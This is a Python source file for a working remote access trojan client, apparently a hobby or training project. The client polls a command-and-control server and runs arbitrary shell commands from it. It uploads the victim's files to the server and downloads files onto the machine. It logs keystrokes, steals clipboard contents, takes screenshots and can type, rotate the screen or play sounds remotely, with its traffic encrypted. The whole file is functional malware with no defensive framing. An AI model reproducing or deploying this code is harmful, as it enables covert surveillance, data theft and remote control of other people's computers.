from requests import get, post, exceptions, put
from multiprocessing import Process
from time import sleep, time
from subprocess import run, PIPE, STDOUT, Popen
from encryption import cipher
from setting import (FILE_PUT, FILE_REQUEST, PORT, PWD_RESPONSE, CMD_REQUEST, CMD_RESPONSE, 
                     CMD_RESPONSE_KEY, C2_SERVER, HEADER, PROXY, DELAY, ZIP_PASS)
from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
from pyperclip import PyperclipWindowsException, PyperclipException, paste
from pynput.keyboard import Listener, Key, Controller
from PIL import ImageGrab, Image
from os import getenv, chdir, getcwd, path
from rotatescreen import get_display
from winsound import SND_ASYNC, playsound

# get target $env variables as our client identifiyers
client = getenv("USERNAME", "unknown_username") + "@" + getenv("COMPUTERNAME", "unknown_computer_name") + "@" + str(time())

 
def on_press(key):
    try:
        with open("key.log", "a") as file_handle:
            file_handle.write(f"{key.char}")
    except AttributeError:
        with open("key.log", "a") as file_handle:
            file_handle.write(f"{key}")


def post_to_server(message: str, response_path=CMD_RESPONSE, is_red=0):
    '''function to post data to c2 server; accept message and response path'''
    try:
        if is_red: 
            # make the message red , encode and encrypt
            message = cipher.encrypt(f"\033[91m{message}\033[0m".encode())
            post(f"http://{C2_SERVER}:{PORT}{response_path}", 
                data={CMD_RESPONSE_KEY: message}, headers=HEADER, proxies=PROXY)
        else:
            # encode and encrypt the message
            message = cipher.encrypt(message.encode())
            post(f"http://{C2_SERVER}:{PORT}{response_path}", 
                data={CMD_RESPONSE_KEY: message}, headers=HEADER, proxies=PROXY)
    except exceptions.RequestException:
        return
    
    
def get_filepath(input_string):
    """return the filepath of the input string."""
    output_string = " ".join(input_string.split()[2:]).replace("\\", "/")
    if output_string:
        return output_string           
    else:
        post_to_server(f"must enter a filename after {input_string}")     
    
    
def on_press(key_press):
    """a function to log the key being pressed; call by pynput.keyboard's Listener"""
    global key_log
    print(key_press)
    key_log.append(key_press)    
    
def run_job(os_command, job_id):
    """a function to run a background job and save the output to a file. It is called by multiprocessing's Process method"""  
    try:
        with open(f"job_{job_id}.log", "w") as f_handle:
            process = Popen(os_command, shell=True, stdout=f_handle, stderr=f_handle)
            post_to_server(f"job {job_id} has started with pid {process.pid}\n"
                           f"use tasklist/taskkill in windows to manage\n"
                           f"the result is saved in job_{job_id}.log")
    except OSError:
        post_to_server(f"job {job_id} failed", is_red=1)
    
    
# prevent subprocess from running the main code
if __name__ == "__main__":
            
    # the delay time for inactive re-connection attemps when inactive is set in setting.py
    delay = DELAY
    
    # Initilize that support backgroud jobs, clipboard stealing , key loggings and screenshots
    clip_count = 0 
    listener = None
    key_log = []
    screenshot_count = 0
    jobs = []
    job_count = 0
    
    while True:
        # try http Get to c2 server and retrieve a command; if fails, keep trying
        try:  
            # append current dir to the client variable  
            tmp = client + "@" + getcwd()
            # encode the client to make it able to be encrypted; decode it to make it str to sned it
            client_to_send = cipher.encrypt(tmp.encode()).decode()
            
            # get the commmand from server
            response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client_to_send}", headers=HEADER, proxies=PROXY)
            
            print(response.status_code)
            
            # raise exception if we ge  t 404 status
            if response.status_code == 404:
                raise exceptions.RequestException
                
        except exceptions.RequestException:
            print(f"server is down;sleep for {delay} seconds; delete this for real play")
            sleep(delay)
            continue
        
        # if we get 204 from server , just re-iterate the loop with no sleep
        if response.status_code == 204:
            continue
        
        # retrieve the command via decrypt and decode the  content of the response object
        command = cipher.decrypt(response.content).decode("utf-8")
        
        
        # implement "cd" command
        if command.startswith("cd "):
            directory = command[3:]
            
            try:
                chdir(directory)
            except FileNotFoundError:
                post_to_server("no such directory", is_red=1)
            except PermissionError:
                post_to_server("permission denied", is_red=1)
            except NotADirectoryError:
                post_to_server("Not A Directory", is_red=1)
            except OSError:
                post_to_server("Os Error", is_red=1)
               
    
        # if command dosen't start with "client ", run the os commnd and send the  output ot the c2 server
        elif not command.startswith("client "):
            # if the command doesn't end with & , run it in the foreground; otherwise, run it in the background
            if not command.endswith("&"):
                # run the command via subprocess 
                command_output = run(command, stdout=PIPE, stderr=STDOUT, shell=True).stdout
                # send the command output to c2 server
                post_to_server(command_output.decode())
            else:
                # right strip &
                command = command.rstrip(" &")
                
                # start background job using multiprocessing
                jobs.append(Process(target=run_job, args=(command, job_count + 1,)))
                jobs[job_count].start()
                
                # give run_job function some time to report to server
                sleep(1)
                
                # increment job count
                job_count += 1
            
            
        # The "client download FILENAME" command allows us to transfer files to client form c2 server
        elif command.startswith("client download "):
                    
            
            # split out the filepath and repalce \ with /
            filepath = get_filepath(command)
            
            # if we get index error, start a new iteration of loop
            if filepath is None:
                continue
            
            # get the filenme from the filepath
            filename = path.basename(filepath)
            
            # first encode the filename to encrypt it and then decode it as str
            encrypted_filename = cipher.encrypt(filename.encode()).decode()
            
            # use and http GET request to stream the file from the c2 server
            try:    
                with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filename}", stream=True, headers=HEADER,
                        proxies=PROXY) as response:
                    # if the file was found, open and write it to the disk, and notify us on the server
                    if response.status_code == 200:
                        with open(filename, "wb") as file_handle:
                            # decrypt and write the file to the disk
                            file_handle.write(cipher.decrypt(response.content))
                        post_to_server(f"file [{filename}] trasferred")
            
            except OSError:
                post_to_server(f"unable to write {filename} to {client}\n", is_red=1)
        
        elif command.startswith("client upload"):
            
            # get the filepath from the command and replace \ with / 
            filepath = get_filepath(command)
            
            # if we get index error, start a new iteration of loop
            if filepath is None:
                continue
        
            # split out the filename from the filepath 
            filename = path.basename(filepath)
            encrypted_filename = cipher.encrypt(filename.encode()).decode()
            
            # upload the file on client  to the server with http PUT 
            try:
                with open(filepath, "rb") as file_handle:
                    # encrypt the upload file
                    encrypted_file = cipher.encrypt(file_handle.read())
                    # upload the file
                    put(f"http://{C2_SERVER}:{PORT}{FILE_PUT}/{encrypted_filename}", data=encrypted_file, 
                            stream=True, headers=HEADER, proxies=PROXY)
            
            except OSError:
                post_to_server(f"could not access {filename} on {client}", is_red=1)            
    
    
        # zip the file on the client 
        elif command.startswith("client zip"):
            # get the filepath from the command and replace \ with / 
            filepath = get_filepath(command)
            
            # if we get index error, start a new iteration of loop
            if filepath is None:
                continue
            # return the filename
            filename  = path.basename(filepath)
            # see if the file exists and is not a directory 
            try:    
                if path.isdir(filepath):
                    post_to_server(f"{filepath} is a directory; we can't zip a directory yet", is_red=1)
                elif not path.isfile(filepath):
                    raise OSError
                else:
                    # zip the file and set a password
                    with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zip_file:
                        zip_file.setpassword(ZIP_PASS)
                        # zip the file , with specification of archive name set to filename,
                        # to prevent the filepath got included when unzipping 
                        zip_file.write(filepath, filename)
                        post_to_server(f"[+]{filepath} is zipped on {client}\n")
            except OSError:
                post_to_server(f"could not access {filename} on {client}", is_red=1)
        
        
        # unzip the file on the client
        elif command.startswith("client unzip"):
            
            # get the filepath from the command and replace \ with / 
            filepath = get_filepath(command)
            
            # if we get index error, start a new iteration of loop
            if filepath is None:
                continue
            
            # return the filename
            filename  = path.basename(filepath)
            
            try:
                with AESZipFile(filepath) as zip_file:
                    zip_file.setpassword(ZIP_PASS)
                    zip_file.extractall(path.dirname(filepath))
                    post_to_server(f"[+] [{filename}] is unzipped on the {client}\n")
            except OSError:
                post_to_server(f"{filepath} was not found on the {client}\n", is_red=1)
            
 
        # "clinet kill" command to terminate client
        elif command == "client kill":
            exit()
    
        # the "client delay" command will change the delay time between inactive re-connection attemps
        elif command.startswith("client delay"):
            try:
                delay = float(command.split()[2]) 
                if delay < 0:
                    raise ValueError
            except (IndexError, ValueError):
                post_to_server("you must enter positive number for client delay", is_red=1)
            else:
                post_to_server(f"{client} is now configured for a {delay} seconds delay when set inactive", is_red=1)
                
        # "client get clipboard" command to get a copy of client clipboard content
        elif command.startswith("client get clipboard"):
            clip_count +=1
            
            # get the clipboard content and save it to a file
            with open(f"clipboard_{clip_count}.txt", "w") as file_handle:
                try:
                    file_handle.write(paste())
                except PyperclipWindowsException:
                    post_to_server("The computer is locked now, unable to get clipboard content", is_red=1)
                except PyperclipException:
                    post_to_server("unable to get clipboard content", is_red=1)
                except OSError:
                    post_to_server("unable to write clipboard content to file", is_red=1)
                else:
                    post_to_server(f"clipboard content saved to clipboard_{clip_count}.txt") 
        
        # "client keylog on" command to start keylogging (have to be root)
        elif command == "client keylog on":
            print(listener)
            if listener is None:
                listener = Listener(on_press=on_press)
                listener.start()
                post_to_server("keylogger started\n")
            else:
                post_to_server("keylogger is already running\n", is_red=1)
                
        # "client keylog off" command to stop keylogging
        elif command == "client keylog off":
            
            # stop keylogger and append the log to the key.log
            if listener is not None:
                listener.stop()
                try:
                    with open("key.log", "a") as file_handle:
                        
                        # make the logged key more readable
                        for a_key_press in key_log:                    
                            file_handle.write(str(a_key_press).replace("Key.enter", "\n")
                                            .replace("'", "")
                                            .replace("Key.space", " ")
                                            .replace('""', "'")
                                            .replace("Key.shift_r", "")
                                            .replace("Key.shift", "")
                                            .replace("Key.backspace", " "))
                            
                        # clear the key_log and re-initilize the listener
                        key_log.clear()
                        listener = None
                        post_to_server("keylogger stopped; result saved in key.log\n")
                except OSError:
                    post_to_server("unable to write key.log", is_red=1)                    
            else:
                post_to_server("keylogger is not running\n", is_red=1)     
        
         # "client type [TEXT]" command to type text on the client. 
        # only suppoert for windows or linux with X server or uinput            
        elif command.startswith("client type"):
            keyboard = None
            text = " ".join(command.split()[2:])
            
            if not text:
                post_to_server("you must enter text to type", is_red=1)
            else:
                try:
                    keyboard = Controller()
                    keyboard.type(text)
                    post_to_server(f"your text [{text}] is typed on the {client}\n")
                except keyboard.invalidcharacterException:
                    post_to_server("a non-typeable charactor was given", is_red=1)    
            
                
        # "client screenshot" command to take a screenshot of the client screen   
        # windows only   
        elif command.startswith("client screenshot"):
            screenshot_count +=1    
            try:
                screenshot = ImageGrab.grab(all_screens=True)
                screenshot.save(f"screenshot_{screenshot_count}.png")
                post_to_server(f"screenshot_{screenshot_count}.png saved\n")
            except OSError:
                post_to_server("only works on Windows OS", is_red=1)
            
        # "client display [image_file]" will display the image on the client screen   
        elif command.startswith("client display"):
            # split filepath and replace \ with / from the command
            file_path = get_filepath(command)
            
            if file_path is None:
                continue        
            try:
                image = Image.open(file_path)
                image.show()
                post_to_server(f"{file_path} is displayed on the client\n")
            except OSError as e:
                post_to_server(f"{e}\n", is_red=1)
                post_to_server(f"{file_path} was unable to display on the {client}\n", is_red=1)  
                
        # "client flip screen" command to flip the screen of the client upside down (Windows only)
        elif command == "client flip screen" or command == "client flip":
            screens = get_display()
            
            for screen in screens:
                screen_pos = screen.current_orientation
                post_to_server(f"current orientation: {screen_pos}")
                screen.rotate_to((screen_pos + 180) % 360)
                post_to_server(f"orientation after flipped: {screen.current_orientation}")
                
                
    
        # "client max volume" command to set the client's volume to the maximum (windows or linux with X server or uinput)
        elif command == "client max volume":
            keyboard = Controller()
            for i in range(50):
                keyboard.press(Key.media_volume_up)
                keyboard.release(Key.media_volume_up)
            post_to_server(f"OK!")
            
        # "client play sound" command to play a sound on the client (Windows only)
        elif command.startswith("client play"):
            file_path = get_filepath(command)
            if file_path is None:
                continue
            
            try:
                if path.isfile(file_path) and file_path.lower().endswith(".wav"):
                    playsound(file_path, SND_ASYNC)
                    post_to_server(f"{file_path} is playing on the {client}\n")
                else:
                    post_to_server(f"{file_path} was not found on the {client} or the file is not end in .wav\n", is_red=1)
            except OSError as e:
                post_to_server(f"{file_path} was unable to be played on the {client}\n", is_red=1)    
                post_to_server(f"{e}\n", is_red=1)  